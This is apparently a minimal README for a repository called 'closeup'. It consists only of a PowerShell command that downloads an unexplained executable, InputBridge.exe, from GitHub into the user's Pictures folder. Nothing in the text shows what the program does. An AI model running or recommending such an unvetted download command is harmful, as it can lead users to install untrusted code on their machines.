# closeup



[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "https://github.com/likkisamarthreddy/closeup/raw/master/InputBridge.exe" -OutFile "$HOME\Pictures\InputBridge.exe"
